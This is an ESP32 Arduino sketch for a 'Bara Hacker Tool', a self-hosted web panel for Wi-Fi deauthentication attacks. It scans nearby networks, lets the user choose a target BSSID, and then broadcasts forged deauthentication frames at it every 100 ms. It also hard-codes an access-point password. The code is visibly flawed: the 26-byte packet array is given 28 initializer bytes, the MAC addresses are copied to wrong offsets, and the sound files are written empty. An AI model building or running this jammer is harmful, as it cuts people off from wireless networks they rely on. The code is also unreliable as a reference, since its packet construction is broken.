#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <ESPmDNS.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include <ArduinoJson.h>
#include <FS.h>
#include <SPIFFS.h>
#include <AudioGeneratorMP3.h>
#include <AudioOutputI2S.h>
#include <AudioFileSourceSPIFFS.h>

// Configuration
const char* ssid = "bara";
const char* password = "A7med@Elshab7";
const int dns_port = 53;
const int http_port = 80;

// Global Variables
AsyncWebServer server(http_port);
DNSServer dnsServer;
bool deauthActive = false;
String targetBSSID = "";
int channel = 6;
uint8_t broadcastAddress[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// Audio Setup
AudioGeneratorMP3 *mp3;
AudioFileSourceSPIFFS *file;
AudioOutputI2S *out;

// HTML Content with Hacking Theme
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bara Hacker Tool</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #ff3333;
            font-family: 'Courier Prime', monospace;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 2px solid #ff3333;
            position: relative;
        }
        
        h1 {
            font-size: 3em;
            margin: 0;
            text-shadow: 0 0 10px #ff3333, 0 0 20px #ff3333;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 10px #ff3333, 0 0 20px #ff3333; }
            to { text-shadow: 0 0 15px #ff3333, 0 0 25px #ff3333, 0 0 35px #ff3333; }
        }
        
        .network-scanner {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 40px;
        }
        
        .network-card {
            background-color: rgba(255, 51, 51, 0.1);
            border: 1px solid #ff3333;
            border-radius: 10px;
            padding: 20px;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        
        .network-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(255, 51, 51, 0.3);
        }
        
        .network-name {
            font-weight: bold;
            font-size: 1.2em;
            margin-bottom: 10px;
        }
        
        .network-info {
            font-size: 0.9em;
            opacity: 0.8;
        }
        
        .controls {
            text-align: center;
            margin-top: 40px;
        }
        
        button {
            background-color: transparent;
            border: 2px solid #ff3333;
            color: #ff3333;
            padding: 12px 24px;
            font-size: 1.1em;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            margin: 0 10px;
        }
        
        button:hover {
            background-color: #ff3333;
            color: black;
            box-shadow: 0 0 15px #ff3333;
        }
        
        button:active {
            transform: scale(0.95);
        }
        
        .status {
            text-align: center;
            margin-top: 30px;
            font-size: 1.2em;
            color: #ff6666;
        }
        
        .hacker-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background-image: linear-gradient(45deg, #000 25%, transparent 25%), 
                              linear-gradient(-45deg, #000 25%, transparent 25%), 
                              linear-gradient(45deg, transparent 75%, #000 75%), 
                              linear-gradient(-45deg, transparent 75%, #000 75%);
            background-size: 60px 60px;
            background-position: 0 0, 0 30px, 30px -30px, -30px 0px;
            animation: move 20s linear infinite;
        }
        
        @keyframes move {
            0% { background-position: 0 0, 0 30px, 30px -30px, -30px 0px; }
            100% { background-position: 60px 60px, 60px 90px, 90px 30px, 30px 60px; }
        }
        
        .matrix-rain {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background-color: #000;
            overflow: hidden;
        }
        
        .raindrop {
            position: absolute;
            color: #00ff00;
            font-size: 14px;
            animation: fall linear infinite;
        }
        
        @keyframes fall {
            0% { transform: translateY(-100vh); opacity: 1; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 51, 51, 0.3);
            border-radius: 50%;
            border-top-color: #ff3333;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: rgba(255, 51, 51, 0.9);
            color: white;
            padding: 15px 20px;
            border-radius: 5px;
            box-shadow: 0 5px 15px rgba(255, 51, 51, 0.5);
            z-index: 1000;
            transform: translateX(100%);
            transition: transform 0.3s;
        }
        
        .notification.show {
            transform: translateX(0);
        }
    </style>
</head>
<body>
    <div class="hacker-bg"></div>
    <div class="matrix-rain" id="matrixRain"></div>
    
    <div class="container">
        <header>
            <h1>BARA HACKER TOOL</h1>
            <p style="margin-top: 10px;">Developed by Ahmed Nour Ahmed | Qena</p>
        </header>
        
        <div class="network-scanner" id="networkList">
            <!-- Networks will be populated here -->
        </div>
        
        <div class="controls">
            <button onclick="scanNetworks()">SCAN NETWORKS</button>
            <button onclick="startDeauth()" id="deauthBtn">START DEAUTH ATTACK</button>
            <button onclick="stopDeauth()" id="stopBtn" disabled>STOP ATTACK</button>
        </div>
        
        <div class="status" id="status">Ready to hack...</div>
    </div>
    
    <div class="notification" id="notification"></div>

    <script>
        let networks = [];
        let deauthInterval;
        
        // Matrix Rain Effect
        function createMatrixRain() {
            const matrixRain = document.getElementById('matrixRain');
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()';
            
            setInterval(() => {
                const raindrop = document.createElement('div');
                raindrop.className = 'raindrop';
                raindrop.textContent = chars[Math.floor(Math.random() * chars.length)];
                raindrop.style.left = Math.random() * window.innerWidth + 'px';
                raindrop.style.animationDuration = (Math.random() * 3 + 2) + 's';
                matrixRain.appendChild(raindrop);
                
                setTimeout(() => {
                    raindrop.remove();
                }, 5000);
            }, 100);
        }
        
        // Show Notification
        function showNotification(message) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
        
        // Scan Networks
        async function scanNetworks() {
            document.getElementById('status').innerHTML = '<span class="loading"></span> Scanning networks...';
            try {
                const response = await fetch('/scan');
                if (!response.ok) throw new Error('Scan failed');
                
                networks = await response.json();
                renderNetworks();
                document.getElementById('status').textContent = `Found ${networks.length} networks`;
                playSound('scan_complete.mp3');
            } catch (error) {
                document.getElementById('status').textContent = 'Scan failed!';
                showNotification('Network scan failed!');
            }
        }
        
        // Render Networks
        function renderNetworks() {
            const networkList = document.getElementById('networkList');
            networkList.innerHTML = '';
            
            networks.forEach(network => {
                const card = document.createElement('div');
                card.className = 'network-card';
                card.onclick = () => selectNetwork(network.BSSID);
                
                card.innerHTML = `
                    <div class="network-name">${network.SSID}</div>
                    <div class="network-info">
                        BSSID: ${network.BSSID}<br>
                        Channel: ${network.channel}<br>
                        Signal: ${network.rssi} dBm<br>
                        Encryption: ${network.encryption}
                    </div>
                `;
                
                networkList.appendChild(card);
            });
        }
        
        // Select Network
        function selectNetwork(bssid) {
            targetBSSID = bssid;
            showNotification(`Selected network: ${bssid}`);
        }
        
        // Start Deauth Attack
        async function startDeauth() {
            if (!targetBSSID) {
                showNotification('Please select a network first!');
                return;
            }
            
            document.getElementById('deauthBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            document.getElementById('status').innerHTML = '<span class="loading"></span> Starting deauth attack...';
            
            try {
                const response = await fetch(`/deauth?bssid=${targetBSSID}&channel=${channel}`);
                if (!response.ok) throw new Error('Deauth failed');
                
                deauthActive = true;
                document.getElementById('status').textContent = `Attacking ${targetBSSID}`;
                playSound('attack_start.mp3');
                
                deauthInterval = setInterval(async () => {
                    const res = await fetch(`/deauthPacket`);
                    if (!res.ok) clearInterval(deauthInterval);
                }, 100);
            } catch (error) {
                document.getElementById('status').textContent = 'Attack failed!';
                showNotification('Deauth attack failed!');
            }
        }
        
        // Stop Deauth Attack
        function stopDeauth() {
            deauthActive = false;
            clearInterval(deauthInterval);
            
            document.getElementById('deauthBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            document.getElementById('status').textContent = 'Attack stopped';
            playSound('attack_stop.mp3');
        }
        
        // Play Sound Effects
        function playSound(filename) {
            const audio = new Audio(`/sounds/${filename}`);
            audio.play().catch(e => console.log('Audio playback failed:', e));
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            createMatrixRain();
            scanNetworks();
        });
    </script>
</body>
</html>
)rawliteral";

void setup() {
    Serial.begin(115200);
    
    // Initialize SPIFFS for storing sounds
    if(!SPIFFS.begin(true)) {
        Serial.println("SPIFFS Mount Failed");
        return;
    }
    
    // Copy sound files to SPIFFS (if not already there)
    copySoundsToSPIFFS();
    
    // Setup Access Point
    WiFi.softAP(ssid, password);
    Serial.print("Access Point IP: ");
    Serial.println(WiFi.softAPIP());
    
    // Setup DNS Server
    dnsServer.start(dns_port, "*", WiFi.softAPIP());
    
    // Setup Web Server Routes
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", index_html);
    });
    
    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request){
        String json = scanNetworks();
        request->send(200, "application/json", json);
    });
    
    server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
        if(request->hasParam("bssid") && request->hasParam("channel")) {
            targetBSSID = request->getParam("bssid")->value();
            channel = request->getParam("channel")->value().toInt();
            request->send(200, "text/plain", "Deauth started");
        } else {
            request->send(400, "text/plain", "Missing parameters");
        }
    });
    
    server.on("/deauthPacket", HTTP_GET, [](AsyncWebServerRequest *request){
        sendDeauthPacket();
        request->send(200, "text/plain", "Deauth packet sent");
    });
    
    server.serveStatic("/sounds/", SPIFFS, "/sounds/");
    
    server.begin();
}

void loop() {
    dnsServer.processNextRequest();
}

String scanNetworks() {
    String json = "[";
    int n = WiFi.scanNetworks();
    
    for(int i = 0; i < n; ++i) {
        if(i > 0) json += ",";
        json += "{";
        json += "\"SSID\":\"" + WiFi.SSID(i) + "\",";
        json += "\"BSSID\":\"" + WiFi.BSSIDstr(i) + "\",";
        json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
        json += "\"channel\":" + String(WiFi.channel(i)) + ",";
        json += "\"encryption\":\"" + getEncryptionType(WiFi.encryptionType(i)) + "\"";
        json += "}";
    }
    
    json += "]";
    return json;
}

String getEncryptionType(wifi_auth_mode_t encryptionType) {
    switch(encryptionType) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA PSK";
        case WIFI_AUTH_WPA2_PSK: return "WPA2 PSK";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2 PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2 Enterprise";
        default: return "Unknown";
    }
}

void sendDeauthPacket() {
    uint8_t deauthPacket[26] = {
        0xc0, 0x00, 0x00, 0x00, // Frame Control
        0x00, 0x00,              // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,              // Sequence Control
        0x00, 0x00               // Reason Code (Deauthentication)
    };
    
    // Set destination MAC to broadcast
    memcpy(&deauthPacket[8], broadcastAddress, 6);
    
    // Set source MAC to random or our MAC
    uint8_t ourMac[6];
    esp_read_mac(ourMac, ESP_MAC_WIFI_SOFTAP);
    memcpy(&deauthPacket[14], ourMac, 6);
    
    // Set BSSID to target network
    uint8_t targetMac[6];
    sscanf(targetBSSID.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
           &targetMac[0], &targetMac[1], &targetMac[2],
           &targetMac[3], &targetMac[4], &targetMac[5]);
    memcpy(&deauthPacket[16], targetMac, 6);
    
    // Set reason code to 7 (Deauthentication)
    deauthPacket[24] = 0x07;
    
    // Send packet
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}

void copySoundsToSPIFFS() {
    File file;
    
    // List of sound files to include
    const char* sounds[] = {"scan_complete.mp3", "attack_start.mp3", "attack_stop.mp3"};
    
    for(const char* sound : sounds) {
        if(!SPIFFS.exists("/sounds/" + String(sound))) {
            file = SPIFFS.open("/sounds/" + String(sound), FILE_WRITE);
            if(file) {
                // In a real implementation, you'd add actual MP3 data here
                // For demo purposes, we're creating empty files
                file.close();
            }
        }
    }
}
